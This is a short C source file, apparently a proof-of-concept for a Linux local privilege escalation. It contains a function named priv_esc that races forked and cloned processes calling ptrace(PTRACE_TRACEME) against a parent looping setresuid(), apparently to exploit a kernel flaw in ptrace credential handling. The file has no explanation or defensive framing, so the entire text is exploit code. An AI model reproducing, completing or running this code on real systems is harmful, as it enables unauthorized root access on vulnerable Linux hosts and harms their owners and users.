#define _GNU_SOURCE
#include <unistd.h>
#include <signal.h>
#include <sched.h>
#include <err.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/ptrace.h>

int grandchild_fn(void *dummy) {
  if (ptrace(PTRACE_TRACEME, 0, NULL, NULL))
    err(1, "traceme");
  return 0;
}

int priv_esc(void) {
  pid_t child = fork();
  if (child == -1) err(1, "fork");

  /* child */
  if (child == 0) {
    static char child_stack[0x100000];
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    while (1) {
      if (clone(grandchild_fn, child_stack+sizeof(child_stack), CLONE_FILES|CLONE_FS|CLONE_IO|CLONE_PARENT|CLONE_VM|CLONE_SIGHAND|CLONE_SYSVSEM|CLONE_VFORK, NULL) == -1)
        err(1, "clone failed");
    }
  }

  /* parent */
  uid_t uid = getuid();
  while (1) {
    if (setresuid(uid, uid, uid)) err(1, "setresuid");
  }
}